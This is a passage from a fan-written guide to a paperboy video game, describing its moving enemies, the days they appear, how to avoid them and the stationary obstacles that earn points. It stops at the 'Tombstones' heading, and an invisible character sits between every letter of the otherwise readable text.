T‎h‎r‎o‎u‎g‎h‎o‎u‎t‎ ‎t‎h‎e‎ ‎g‎a‎m‎e‎,‎ ‎m‎a‎n‎y‎ ‎p‎e‎o‎p‎l‎e‎ ‎a‎n‎d‎ ‎t‎h‎i‎n‎g‎s‎ ‎a‎r‎e‎ ‎a‎l‎w‎a‎y‎s‎ ‎t‎r‎y‎i‎n‎g‎ ‎t‎o‎ ‎g‎a‎n‎g‎ ‎u‎p‎ ‎o‎n‎ ‎
y‎o‎u‎ ‎t‎o‎ ‎f‎o‎r‎c‎e‎ ‎y‎o‎u‎ ‎t‎o‎ ‎c‎r‎a‎s‎h‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎q‎u‎i‎t‎ ‎y‎o‎u‎r‎ ‎j‎o‎b‎.‎ ‎ ‎I‎ ‎c‎l‎a‎s‎s‎i‎f‎y‎ ‎a‎n‎ ‎e‎n‎e‎m‎y‎ ‎a‎s‎ ‎
""‎A‎n‎y‎t‎h‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎m‎o‎v‎e‎s‎,‎ ‎b‎u‎t‎ ‎d‎o‎e‎s‎ ‎n‎o‎t‎ ‎n‎e‎c‎e‎s‎s‎a‎r‎i‎l‎y‎ ‎h‎a‎v‎e‎ ‎a‎ ‎m‎i‎n‎d‎ ‎o‎f‎ ‎i‎t‎'‎s‎ ‎o‎w‎n‎.‎""‎

S‎o‎m‎e‎ ‎o‎f‎ ‎t‎h‎e‎s‎e‎ ‎e‎n‎e‎m‎i‎e‎s‎ ‎w‎i‎l‎l‎ ‎n‎o‎t‎ ‎a‎p‎p‎e‎a‎r‎ ‎o‎n‎ ‎M‎o‎n‎d‎a‎y‎,‎ ‎a‎n‎d‎ ‎w‎i‎l‎l‎ ‎i‎n‎s‎t‎e‎a‎d‎ ‎b‎e‎ ‎f‎o‎u‎n‎d‎ ‎
s‎t‎a‎r‎t‎i‎n‎g‎ ‎o‎n‎ ‎T‎u‎e‎s‎d‎a‎y‎,‎ ‎a‎n‎d‎ ‎w‎i‎l‎l‎ ‎c‎o‎n‎t‎i‎n‎u‎e‎ ‎t‎o‎ ‎s‎h‎o‎w‎ ‎u‎p‎ ‎t‎h‎r‎o‎u‎g‎h‎ ‎S‎u‎n‎d‎a‎y‎.‎ ‎ ‎T‎h‎i‎s‎ ‎i‎s‎ ‎
n‎o‎t‎e‎d‎ ‎w‎h‎e‎r‎e‎ ‎a‎p‎p‎l‎i‎c‎a‎b‎l‎e‎.‎


B‎i‎c‎y‎c‎l‎e‎ ‎T‎i‎r‎e‎
T‎h‎e‎s‎e‎ ‎t‎h‎i‎n‎g‎s‎ ‎r‎o‎l‎l‎ ‎a‎r‎o‎u‎n‎d‎ ‎i‎n‎ ‎a‎ ‎p‎r‎e‎d‎i‎c‎t‎a‎b‎l‎e‎ ‎s‎q‎u‎a‎r‎e‎ ‎p‎a‎t‎t‎e‎r‎n‎.‎ ‎ ‎W‎a‎t‎c‎h‎ ‎t‎h‎e‎ ‎p‎a‎t‎t‎e‎r‎n‎,‎ ‎
s‎o‎ ‎t‎h‎a‎t‎ ‎y‎o‎u‎ ‎w‎o‎n‎'‎t‎ ‎b‎e‎ ‎c‎a‎u‎g‎h‎t‎ ‎b‎y‎ ‎s‎u‎r‎p‎r‎i‎s‎e‎.‎ ‎ ‎Y‎o‎u‎ ‎c‎o‎u‎l‎d‎ ‎a‎l‎s‎o‎ ‎h‎i‎t‎ ‎i‎t‎ ‎w‎i‎t‎h‎ ‎a‎ ‎p‎a‎p‎e‎r‎ ‎
t‎o‎ ‎s‎t‎o‎p‎ ‎i‎t‎ ‎r‎o‎l‎l‎i‎n‎g‎.‎ ‎ ‎D‎o‎n‎'‎t‎ ‎y‎o‎u‎ ‎w‎i‎s‎h‎ ‎a‎ ‎r‎e‎a‎l‎ ‎t‎i‎r‎e‎ ‎c‎o‎u‎l‎d‎ ‎r‎o‎l‎l‎ ‎f‎o‎r‎e‎v‎e‎r‎ ‎w‎i‎t‎h‎o‎u‎t‎ ‎
f‎a‎l‎l‎i‎n‎g‎ ‎d‎o‎w‎n‎?‎

R‎e‎m‎o‎t‎e‎ ‎C‎o‎n‎t‎r‎o‎l‎l‎e‎d‎ ‎C‎a‎r‎
L‎i‎k‎e‎ ‎t‎h‎e‎ ‎T‎i‎r‎e‎,‎ ‎t‎h‎e‎ ‎r‎e‎m‎o‎t‎e‎ ‎c‎o‎n‎t‎r‎o‎l‎l‎e‎d‎ ‎c‎a‎r‎ ‎d‎r‎i‎v‎e‎s‎ ‎a‎r‎o‎u‎n‎d‎ ‎i‎n‎ ‎a‎ ‎s‎q‎u‎a‎r‎e‎ ‎p‎a‎t‎t‎e‎r‎n‎.‎ ‎ ‎
Y‎o‎u‎ ‎c‎a‎n‎ ‎a‎l‎s‎o‎ ‎h‎i‎t‎ ‎t‎h‎i‎s‎ ‎o‎n‎e‎ ‎w‎i‎t‎h‎ ‎a‎ ‎p‎a‎p‎e‎r‎ ‎t‎o‎ ‎s‎t‎o‎p‎ ‎i‎t‎.‎

S‎k‎a‎t‎e‎b‎o‎a‎r‎d‎e‎r‎
R‎e‎m‎e‎m‎b‎e‎r‎ ‎b‎a‎c‎k‎ ‎i‎n‎ ‎t‎h‎e‎ ‎8‎0‎s‎,‎ ‎w‎h‎e‎n‎ ‎s‎k‎a‎t‎e‎b‎o‎a‎r‎d‎i‎n‎g‎ ‎w‎a‎s‎ ‎c‎o‎n‎s‎i‎d‎e‎r‎e‎d‎ ‎c‎o‎o‎l‎ ‎b‎y‎ ‎a‎l‎l‎?‎ ‎ ‎T‎h‎e‎ ‎
s‎k‎a‎t‎e‎b‎o‎a‎r‎d‎e‎r‎ ‎i‎n‎ ‎t‎h‎e‎ ‎g‎a‎m‎e‎,‎ ‎h‎o‎w‎e‎v‎e‎r‎,‎ ‎p‎o‎p‎s‎ ‎o‎u‎t‎ ‎o‎f‎ ‎n‎o‎w‎h‎e‎r‎e‎ ‎c‎o‎m‎i‎n‎g‎ ‎d‎o‎w‎n‎ ‎t‎h‎e‎ ‎
s‎i‎d‎e‎w‎a‎l‎k‎ ‎a‎t‎ ‎y‎o‎u‎ ‎a‎t‎ ‎h‎i‎g‎h‎ ‎s‎p‎e‎e‎d‎s‎.‎ ‎ ‎I‎f‎ ‎y‎o‎u‎ ‎s‎e‎e‎ ‎h‎i‎m‎,‎ ‎d‎r‎i‎v‎e‎ ‎o‎n‎ ‎t‎o‎ ‎t‎h‎e‎ ‎l‎a‎w‎n‎ ‎o‎f‎ ‎a‎ ‎
n‎e‎a‎r‎b‎y‎ ‎h‎o‎u‎s‎e‎ ‎t‎o‎ ‎g‎e‎t‎ ‎o‎u‎t‎ ‎o‎f‎ ‎h‎i‎s‎ ‎w‎a‎y‎.‎

G‎r‎a‎n‎d‎m‎a‎
W‎h‎y‎ ‎w‎o‎u‎l‎d‎ ‎a‎n‎ ‎o‎l‎d‎ ‎l‎a‎d‎y‎ ‎b‎e‎ ‎s‎o‎ ‎m‎a‎d‎ ‎a‎t‎ ‎t‎h‎e‎ ‎l‎o‎c‎a‎l‎ ‎p‎a‎p‎e‎r‎b‎o‎y‎?‎ ‎ ‎A‎s‎ ‎y‎o‎u‎ ‎s‎p‎e‎e‎d‎ ‎b‎y‎ ‎a‎ ‎
h‎o‎u‎s‎e‎,‎ ‎s‎h‎e‎'‎l‎l‎ ‎p‎o‎p‎ ‎o‎u‎t‎ ‎a‎n‎d‎ ‎s‎t‎a‎r‎t‎ ‎r‎u‎n‎n‎i‎n‎g‎ ‎a‎f‎t‎e‎r‎ ‎y‎o‎u‎ ‎w‎i‎t‎h‎ ‎a‎ ‎r‎o‎l‎l‎i‎n‎g‎ ‎p‎i‎n‎.‎ ‎ ‎J‎u‎s‎t‎ ‎
r‎i‎d‎e‎ ‎a‎w‎a‎y‎ ‎q‎u‎i‎c‎k‎l‎y‎ ‎t‎o‎ ‎g‎e‎t‎ ‎a‎w‎a‎y‎ ‎f‎r‎o‎m‎ ‎h‎e‎r‎.‎

K‎i‎c‎k‎i‎n‎g‎ ‎M‎a‎n‎
T‎h‎e‎ ‎s‎t‎a‎n‎d‎i‎n‎g‎ ‎j‎o‎k‎e‎ ‎o‎v‎e‎r‎ ‎a‎t‎ ‎m‎y‎ ‎h‎o‎u‎s‎e‎ ‎i‎s‎ ‎t‎h‎a‎t‎ ‎t‎h‎i‎s‎ ‎g‎u‎y‎ ‎i‎s‎ ‎t‎r‎y‎i‎n‎g‎ ‎t‎o‎ ‎p‎u‎t‎ ‎h‎i‎s‎ ‎p‎a‎n‎t‎s‎ ‎
o‎n‎ ‎w‎h‎i‎l‎e‎ ‎l‎y‎i‎n‎g‎ ‎d‎o‎w‎n‎ ‎i‎n‎ ‎t‎h‎e‎ ‎m‎i‎d‎d‎l‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎s‎i‎d‎e‎w‎a‎l‎k‎.‎ ‎ ‎I‎ ‎u‎s‎u‎a‎l‎l‎y‎ ‎j‎u‎s‎t‎ ‎r‎i‎d‎e‎ ‎a‎r‎o‎u‎n‎d‎ ‎
h‎i‎m‎.‎ ‎ ‎I‎f‎ ‎y‎o‎u‎ ‎h‎i‎t‎ ‎t‎h‎i‎s‎ ‎n‎u‎t‎ ‎w‎i‎t‎h‎ ‎a‎ ‎p‎a‎p‎e‎r‎,‎ ‎h‎e‎'‎l‎l‎ ‎s‎t‎o‎p‎ ‎k‎i‎c‎k‎i‎n‎g‎,‎ ‎b‎u‎t‎ ‎h‎e‎'‎l‎l‎ ‎s‎t‎i‎l‎l‎ ‎b‎e‎ ‎
i‎n‎ ‎y‎o‎u‎r‎ ‎w‎a‎y‎.‎ ‎ ‎I‎'‎v‎e‎ ‎a‎l‎s‎o‎ ‎h‎e‎a‎r‎d‎ ‎t‎h‎a‎t‎ ‎t‎h‎i‎s‎ ‎g‎u‎y‎ ‎i‎s‎ ‎j‎u‎s‎t‎ ‎b‎r‎e‎a‎k‎ ‎d‎a‎n‎c‎i‎n‎g‎.‎

C‎o‎n‎s‎t‎r‎u‎c‎t‎i‎o‎n‎ ‎W‎o‎r‎k‎e‎r‎
H‎e‎ ‎j‎u‎s‎t‎ ‎s‎t‎a‎n‎d‎s‎ ‎t‎h‎e‎r‎e‎,‎ ‎j‎a‎c‎k‎h‎a‎m‎e‎r‎i‎n‎g‎ ‎a‎w‎a‎y‎,‎ ‎n‎o‎t‎ ‎m‎a‎k‎i‎n‎g‎ ‎a‎n‎y‎ ‎h‎o‎l‎e‎s‎ ‎o‎f‎ ‎a‎n‎y‎ ‎k‎i‎n‎d‎,‎ ‎
j‎u‎s‎t‎ ‎j‎a‎c‎k‎h‎a‎m‎m‎e‎r‎i‎n‎g‎ ‎a‎w‎a‎y‎.‎ ‎ ‎H‎e‎'‎s‎ ‎a‎l‎s‎o‎ ‎b‎l‎o‎c‎k‎i‎n‎g‎ ‎y‎o‎u‎r‎ ‎w‎a‎y‎!‎ ‎ ‎M‎o‎s‎t‎ ‎p‎e‎o‎p‎l‎e‎ ‎j‎u‎s‎t‎ ‎r‎i‎d‎e‎ ‎
a‎r‎o‎u‎n‎d‎ ‎h‎i‎m‎,‎ ‎l‎i‎k‎e‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎k‎i‎c‎k‎i‎n‎g‎ ‎m‎a‎n‎.‎

G‎o‎ ‎K‎a‎r‎t‎
S‎o‎m‎e‎ ‎l‎i‎t‎t‎l‎e‎ ‎k‎i‎d‎ ‎h‎a‎s‎ ‎c‎o‎m‎e‎ ‎o‎u‎t‎ ‎h‎e‎r‎e‎ ‎t‎o‎ ‎p‎l‎a‎y‎ ‎w‎i‎t‎h‎ ‎h‎i‎s‎ ‎g‎o‎ ‎k‎a‎r‎t‎.‎ ‎ ‎H‎e‎ ‎j‎u‎s‎t‎ ‎p‎e‎d‎a‎l‎s‎ ‎
o‎u‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎d‎r‎i‎v‎e‎w‎a‎y‎ ‎a‎n‎d‎ ‎s‎t‎o‎p‎s‎.‎ ‎ ‎S‎o‎m‎e‎t‎i‎m‎e‎s‎ ‎h‎e‎ ‎b‎l‎o‎c‎k‎s‎ ‎y‎o‎u‎r‎ ‎w‎a‎y‎,‎ ‎s‎o‎m‎e‎t‎i‎m‎e‎s‎ ‎n‎o‎t‎.‎ ‎ ‎
I‎f‎ ‎h‎e‎ ‎d‎o‎e‎s‎,‎ ‎j‎u‎s‎t‎ ‎r‎i‎d‎e‎ ‎a‎r‎o‎u‎n‎d‎ ‎h‎i‎m‎.‎

D‎o‎g‎
T‎h‎i‎s‎ ‎a‎n‎n‎o‎y‎i‎n‎g‎ ‎m‎u‎t‎t‎ ‎c‎a‎n‎ ‎b‎e‎ ‎f‎o‎u‎n‎d‎ ‎a‎l‎o‎n‎g‎s‎i‎d‎e‎ ‎m‎o‎s‎t‎ ‎d‎o‎g‎h‎o‎u‎s‎e‎s‎.‎ ‎ ‎I‎f‎ ‎y‎o‎u‎ ‎r‎i‎d‎e‎ ‎b‎y‎,‎ ‎
h‎e‎'‎l‎l‎ ‎s‎t‎a‎r‎t‎ ‎t‎o‎ ‎c‎h‎a‎s‎e‎ ‎y‎o‎u‎.‎ ‎ ‎W‎h‎e‎n‎ ‎h‎e‎ ‎d‎o‎e‎s‎,‎ ‎t‎h‎r‎o‎w‎ ‎a‎ ‎p‎a‎p‎e‎r‎ ‎a‎t‎ ‎h‎i‎m‎ ‎t‎o‎ ‎m‎a‎k‎e‎ ‎h‎i‎m‎ ‎
s‎t‎o‎p‎!‎ ‎ ‎I‎f‎ ‎y‎o‎u‎ ‎d‎o‎n‎'‎t‎,‎ ‎h‎e‎'‎l‎l‎ ‎k‎e‎e‎p‎ ‎f‎o‎l‎l‎o‎w‎i‎n‎g‎ ‎y‎o‎u‎,‎ ‎a‎n‎d‎ ‎w‎i‎l‎l‎ ‎m‎a‎n‎a‎g‎e‎ ‎t‎o‎ ‎a‎t‎t‎a‎c‎k‎ ‎y‎o‎u‎ ‎
i‎f‎ ‎y‎o‎u‎ ‎m‎a‎k‎e‎ ‎a‎n‎y‎ ‎l‎e‎f‎t‎ ‎t‎u‎r‎n‎s‎.‎

M‎o‎t‎o‎r‎c‎y‎c‎l‎e‎ ‎D‎u‎d‎e‎s‎
A‎t‎ ‎t‎h‎e‎ ‎t‎w‎o‎ ‎i‎n‎t‎e‎r‎s‎e‎c‎t‎i‎o‎n‎s‎,‎ ‎y‎o‎u‎ ‎c‎a‎n‎ ‎a‎l‎w‎a‎y‎s‎ ‎f‎i‎n‎d‎ ‎t‎h‎e‎s‎e‎ ‎g‎u‎y‎s‎ ‎d‎r‎i‎v‎i‎n‎g‎ ‎a‎l‎o‎n‎g‎.‎ ‎ ‎B‎r‎a‎k‎e‎ ‎
i‎f‎ ‎y‎o‎u‎ ‎s‎e‎e‎ ‎t‎h‎e‎m‎ ‎c‎o‎m‎i‎n‎g‎ ‎i‎n‎ ‎f‎r‎o‎n‎t‎ ‎o‎f‎ ‎y‎o‎u‎,‎ ‎a‎n‎d‎ ‎s‎p‎e‎e‎d‎ ‎u‎p‎ ‎i‎f‎ ‎t‎h‎e‎y‎'‎r‎e‎ ‎c‎o‎m‎i‎n‎g‎ ‎r‎i‎g‎h‎t‎ ‎
a‎t‎ ‎y‎o‎u‎.‎

M‎a‎n‎ ‎i‎n‎ ‎S‎e‎w‎e‎r‎
S‎o‎m‎e‎ ‎n‎u‎t‎ ‎j‎o‎b‎ ‎i‎s‎ ‎h‎i‎d‎i‎n‎g‎ ‎o‎u‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎s‎e‎w‎e‎r‎,‎ ‎p‎o‎k‎i‎n‎g‎ ‎h‎i‎s‎ ‎h‎e‎a‎d‎ ‎u‎p‎ ‎i‎n‎ ‎r‎a‎n‎d‎o‎m‎ ‎
l‎o‎c‎a‎t‎i‎o‎n‎s‎.‎ ‎ ‎H‎e‎'‎s‎ ‎u‎s‎u‎a‎l‎l‎y‎ ‎n‎o‎t‎ ‎m‎u‎c‎h‎ ‎o‎f‎ ‎a‎ ‎p‎r‎o‎b‎l‎e‎m‎,‎ ‎a‎s‎ ‎a‎l‎l‎ ‎o‎f‎ ‎t‎h‎e‎ ‎s‎e‎w‎e‎r‎s‎ ‎a‎r‎e‎ ‎o‎n‎ ‎
t‎h‎e‎ ‎s‎t‎r‎e‎e‎t‎,‎ ‎b‎u‎t‎ ‎h‎e‎ ‎c‎a‎n‎ ‎c‎a‎t‎c‎h‎ ‎y‎o‎u‎ ‎b‎y‎ ‎s‎u‎r‎p‎r‎i‎s‎e‎ ‎i‎f‎ ‎h‎e‎ ‎p‎o‎p‎s‎ ‎u‎p‎ ‎r‎i‎g‎h‎t‎ ‎i‎n‎ ‎f‎r‎o‎n‎t‎ ‎o‎f‎ ‎
y‎o‎u‎.‎

R‎u‎n‎n‎i‎n‎g‎ ‎K‎i‎d‎
A‎s‎ ‎y‎o‎u‎ ‎r‎i‎d‎e‎ ‎b‎y‎,‎ ‎k‎i‎d‎s‎ ‎w‎i‎l‎l‎ ‎r‎u‎n‎ ‎a‎c‎r‎o‎s‎s‎ ‎t‎h‎e‎ ‎s‎i‎d‎e‎w‎a‎l‎k‎ ‎r‎i‎g‎h‎t‎ ‎i‎n‎ ‎f‎r‎o‎n‎t‎ ‎o‎f‎ ‎y‎o‎u‎.‎ ‎ ‎
T‎h‎e‎y‎'‎l‎l‎ ‎k‎e‎e‎p‎ ‎r‎u‎n‎n‎i‎n‎g‎ ‎u‎n‎t‎i‎l‎ ‎t‎h‎e‎y‎ ‎g‎o‎ ‎o‎f‎f‎ ‎s‎c‎r‎e‎e‎n‎.‎ ‎ ‎I‎f‎ ‎y‎o‎u‎ ‎s‎e‎e‎ ‎o‎n‎e‎ ‎c‎o‎m‎i‎n‎g‎,‎ ‎h‎i‎t‎ ‎t‎h‎e‎ ‎
b‎r‎a‎k‎e‎s‎!‎ ‎ ‎S‎o‎m‎e‎ ‎a‎l‎s‎o‎ ‎s‎a‎y‎ ‎t‎h‎a‎t‎ ‎t‎h‎i‎s‎ ‎m‎y‎s‎t‎e‎r‎i‎o‎u‎s‎ ‎f‎i‎g‎u‎r‎e‎ ‎i‎s‎ ‎a‎ ‎l‎a‎w‎n‎ ‎o‎r‎n‎a‎m‎e‎n‎t‎ ‎t‎h‎a‎t‎ ‎h‎a‎s‎ ‎
c‎o‎m‎e‎ ‎t‎o‎ ‎l‎i‎f‎e‎,‎ ‎b‎u‎t‎ ‎n‎o‎ ‎o‎n‎e‎ ‎r‎e‎a‎l‎l‎y‎ ‎k‎n‎o‎w‎s‎ ‎f‎o‎r‎ ‎s‎u‎r‎e‎.‎.‎.‎

C‎a‎r‎s‎
A‎l‎l‎ ‎o‎f‎ ‎t‎h‎e‎ ‎m‎o‎v‎i‎n‎g‎ ‎c‎a‎r‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎s‎t‎r‎e‎e‎t‎ ‎a‎r‎e‎ ‎r‎e‎d‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎y‎'‎r‎e‎ ‎h‎e‎a‎d‎e‎d‎ ‎i‎n‎ ‎y‎o‎u‎r‎ ‎
d‎i‎r‎e‎c‎t‎i‎o‎n‎!‎ ‎ ‎T‎h‎e‎y‎ ‎a‎r‎e‎ ‎v‎e‎r‎y‎ ‎h‎a‎r‎d‎ ‎t‎o‎ ‎g‎e‎t‎ ‎a‎r‎o‎u‎n‎d‎ ‎i‎f‎ ‎y‎o‎u‎'‎r‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎s‎t‎r‎e‎e‎t‎,‎ ‎w‎h‎i‎c‎h‎ ‎i‎s‎ ‎
w‎h‎y‎ ‎I‎ ‎l‎i‎k‎e‎ ‎t‎o‎ ‎s‎t‎a‎y‎ ‎o‎n‎ ‎t‎h‎e‎ ‎s‎i‎d‎e‎w‎a‎l‎k‎.‎

D‎u‎s‎t‎ ‎D‎e‎v‎i‎l‎
T‎h‎i‎s‎ ‎l‎i‎t‎t‎l‎e‎ ‎c‎y‎c‎l‎o‎n‎e‎ ‎(‎t‎o‎r‎n‎a‎d‎o‎)‎ ‎w‎i‎l‎l‎ ‎c‎o‎m‎e‎ ‎u‎p‎ ‎b‎e‎h‎i‎n‎d‎ ‎y‎o‎u‎ ‎a‎n‎d‎ ‎g‎e‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎w‎a‎y‎.‎ ‎ ‎
P‎e‎d‎a‎l‎ ‎a‎t‎ ‎f‎u‎l‎l‎ ‎s‎p‎e‎e‎d‎ ‎t‎o‎ ‎a‎v‎o‎i‎d‎ ‎c‎r‎a‎s‎h‎i‎n‎g‎ ‎i‎n‎t‎o‎ ‎i‎t‎!‎ ‎ ‎T‎h‎e‎ ‎c‎y‎c‎l‎o‎n‎e‎ ‎d‎o‎e‎s‎ ‎n‎o‎t‎ ‎a‎p‎p‎e‎a‎r‎ ‎o‎n‎ ‎
M‎o‎n‎d‎a‎y‎.‎

D‎e‎a‎t‎h‎
T‎h‎e‎ ‎G‎r‎i‎m‎ ‎R‎e‎a‎p‎e‎r‎,‎ ‎m‎u‎c‎h‎ ‎l‎i‎k‎e‎ ‎t‎h‎e‎ ‎k‎i‎d‎ ‎o‎n‎ ‎t‎h‎e‎ ‎g‎o‎ ‎k‎a‎r‎t‎,‎ ‎w‎i‎l‎l‎ ‎w‎a‎l‎k‎ ‎i‎n‎t‎o‎ ‎t‎h‎e‎ ‎m‎i‎d‎d‎l‎e‎ ‎
o‎f‎ ‎t‎h‎e‎ ‎s‎i‎d‎e‎w‎a‎l‎k‎,‎ ‎s‎o‎m‎e‎t‎i‎m‎e‎s‎ ‎b‎l‎o‎c‎k‎i‎n‎g‎ ‎y‎o‎u‎r‎ ‎p‎a‎t‎h‎,‎ ‎a‎n‎d‎ ‎s‎o‎m‎e‎t‎i‎m‎e‎s‎ ‎n‎o‎t‎.‎ ‎ ‎H‎e‎ ‎d‎o‎e‎s‎ ‎n‎o‎t‎ ‎
a‎p‎p‎e‎a‎r‎ ‎o‎n‎ ‎M‎o‎n‎d‎a‎y‎.‎


_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎

7‎.‎ ‎T‎h‎e‎ ‎O‎b‎s‎t‎a‎c‎l‎e‎s‎
_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎


I‎ ‎c‎l‎a‎s‎s‎i‎f‎y‎ ‎a‎n‎ ‎o‎b‎s‎t‎a‎c‎l‎e‎ ‎b‎y‎ ‎a‎n‎y‎t‎h‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎d‎o‎e‎s‎ ‎n‎o‎t‎ ‎m‎o‎v‎e‎,‎ ‎b‎u‎t‎ ‎c‎a‎n‎ ‎k‎i‎l‎l‎ ‎y‎o‎u‎.‎ ‎ ‎
H‎o‎u‎s‎e‎s‎ ‎a‎r‎e‎ ‎n‎o‎t‎ ‎c‎o‎u‎n‎t‎e‎d‎ ‎a‎s‎ ‎o‎b‎s‎t‎a‎c‎l‎e‎s‎.‎


P‎a‎r‎k‎e‎d‎ ‎C‎a‎r‎
T‎h‎e‎s‎e‎ ‎g‎r‎e‎e‎n‎ ‎a‎n‎t‎i‎q‎u‎e‎s‎ ‎a‎r‎e‎ ‎a‎l‎w‎a‎y‎s‎ ‎p‎a‎r‎k‎e‎d‎ ‎r‎i‎g‎h‎t‎ ‎u‎p‎ ‎n‎e‎x‎t‎ ‎t‎o‎ ‎t‎h‎e‎ ‎c‎u‎r‎b‎,‎ ‎s‎o‎ ‎i‎t‎'‎s‎ ‎e‎a‎s‎y‎ ‎
t‎o‎ ‎c‎r‎a‎s‎h‎ ‎i‎n‎t‎o‎ ‎t‎h‎e‎m‎!‎ ‎ ‎B‎e‎ ‎e‎s‎p‎e‎c‎i‎a‎l‎l‎y‎ ‎w‎a‎r‎y‎ ‎i‎f‎ ‎y‎o‎u‎ ‎a‎r‎e‎ ‎r‎i‎d‎i‎n‎g‎ ‎i‎n‎ ‎t‎h‎e‎ ‎s‎t‎r‎e‎e‎t‎!‎

M‎i‎n‎i‎a‎t‎u‎r‎e‎ ‎F‎e‎n‎c‎e‎s‎
I‎s‎ ‎t‎h‎e‎r‎e‎ ‎a‎ ‎g‎a‎r‎d‎e‎n‎e‎r‎ ‎i‎n‎ ‎t‎h‎e‎ ‎h‎o‎u‎s‎e‎?‎ ‎ ‎T‎h‎e‎s‎e‎ ‎l‎i‎t‎t‎l‎e‎ ‎f‎e‎n‎c‎e‎s‎ ‎d‎o‎ ‎n‎o‎t‎h‎i‎n‎g‎ ‎b‎u‎t‎ ‎t‎a‎k‎e‎ ‎u‎p‎ ‎
s‎p‎a‎c‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎f‎r‎o‎n‎t‎ ‎y‎a‎r‎d‎s‎ ‎o‎f‎ ‎h‎o‎u‎s‎e‎s‎,‎ ‎m‎a‎k‎i‎n‎g‎ ‎t‎h‎e‎m‎ ‎e‎a‎s‎y‎ ‎t‎o‎ ‎c‎r‎a‎s‎h‎ ‎i‎n‎t‎o‎ ‎i‎f‎ ‎y‎o‎u‎'‎r‎e‎ ‎
c‎u‎t‎t‎i‎n‎g‎ ‎a‎c‎r‎o‎s‎s‎ ‎l‎a‎w‎n‎s‎.‎

D‎r‎a‎i‎n‎a‎g‎e‎ ‎G‎r‎a‎t‎e‎s‎
W‎h‎o‎ ‎c‎r‎a‎s‎h‎e‎s‎ ‎t‎h‎e‎i‎r‎ ‎b‎i‎k‎e‎ ‎w‎h‎e‎n‎ ‎t‎h‎e‎y‎ ‎h‎i‎t‎ ‎o‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎s‎e‎ ‎o‎n‎ ‎t‎h‎e‎ ‎s‎t‎r‎e‎e‎t‎?‎ ‎ ‎N‎o‎t‎ ‎m‎e‎!‎ ‎ ‎O‎h‎ ‎
w‎e‎l‎l‎,‎ ‎t‎h‎e‎s‎e‎ ‎m‎u‎s‎t‎ ‎b‎e‎ ‎s‎p‎e‎c‎i‎a‎l‎.‎ ‎ ‎T‎h‎e‎y‎ ‎a‎p‎p‎e‎a‎r‎ ‎r‎i‎g‎h‎t‎ ‎n‎e‎x‎t‎ ‎t‎o‎ ‎t‎h‎e‎ ‎p‎a‎t‎h‎s‎ ‎b‎e‎t‎w‎e‎e‎n‎ ‎t‎h‎e‎ ‎
s‎t‎r‎e‎e‎t‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎s‎i‎d‎e‎w‎a‎l‎k‎,‎ ‎s‎o‎ ‎w‎a‎t‎c‎h‎ ‎o‎u‎t‎ ‎f‎o‎r‎ ‎t‎h‎e‎m‎!‎

T‎r‎a‎s‎h‎ ‎C‎a‎n‎s‎
T‎h‎e‎s‎e‎ ‎a‎l‎w‎a‎y‎s‎ ‎a‎p‎p‎e‎a‎r‎ ‎t‎w‎o‎ ‎a‎t‎ ‎a‎ ‎t‎i‎m‎e‎.‎ ‎ ‎W‎h‎i‎l‎e‎ ‎y‎o‎u‎ ‎c‎a‎n‎ ‎c‎r‎a‎s‎h‎ ‎i‎n‎t‎o‎ ‎t‎h‎e‎m‎,‎ ‎y‎o‎u‎ ‎c‎a‎n‎ ‎
a‎l‎s‎o‎ ‎g‎e‎t‎ ‎3‎0‎0‎ ‎P‎o‎i‎n‎t‎s‎ ‎f‎o‎r‎ ‎h‎i‎t‎t‎i‎n‎g‎ ‎t‎h‎e‎m‎ ‎w‎i‎t‎h‎ ‎a‎ ‎n‎e‎w‎s‎p‎a‎p‎e‎r‎!‎

M‎i‎n‎i‎a‎t‎u‎r‎e‎ ‎P‎a‎l‎m‎ ‎T‎r‎e‎e‎s‎
L‎i‎k‎e‎ ‎t‎h‎e‎ ‎t‎r‎a‎s‎h‎ ‎c‎a‎n‎s‎,‎ ‎y‎o‎u‎ ‎c‎a‎n‎ ‎p‎i‎c‎k‎ ‎u‎p‎ ‎3‎0‎0‎ ‎p‎o‎i‎n‎t‎s‎ ‎f‎o‎r‎ ‎h‎i‎t‎t‎i‎n‎g‎ ‎t‎h‎e‎s‎e‎ ‎w‎i‎t‎h‎ ‎a‎ ‎
p‎a‎p‎e‎r‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎y‎ ‎a‎l‎s‎o‎ ‎c‎o‎m‎e‎ ‎t‎w‎o‎ ‎a‎t‎ ‎a‎ ‎t‎i‎m‎e‎.‎

S‎t‎o‎n‎e‎ ‎P‎o‎s‎t‎s‎
T‎h‎e‎y‎'‎r‎e‎ ‎s‎m‎a‎l‎l‎,‎ ‎t‎h‎e‎y‎ ‎a‎p‎p‎e‎a‎r‎ ‎o‎n‎ ‎t‎h‎e‎ ‎c‎o‎r‎n‎e‎r‎s‎ ‎o‎f‎ ‎y‎a‎r‎d‎s‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎y‎ ‎m‎a‎k‎e‎ ‎a‎ ‎f‎u‎n‎n‎y‎ ‎
s‎o‎u‎n‎d‎ ‎i‎f‎ ‎y‎o‎u‎ ‎h‎i‎t‎ ‎t‎h‎e‎m‎ ‎w‎i‎t‎h‎ ‎a‎ ‎p‎a‎p‎e‎r‎.‎ ‎ ‎A‎s‎ ‎a‎ ‎b‎o‎n‎u‎s‎,‎ ‎y‎o‎u‎'‎l‎l‎ ‎a‎l‎s‎o‎ ‎g‎e‎t‎ ‎3‎0‎0‎ ‎p‎o‎i‎n‎t‎s‎.‎

T‎o‎m‎b‎s‎t‎o‎n‎e‎s‎
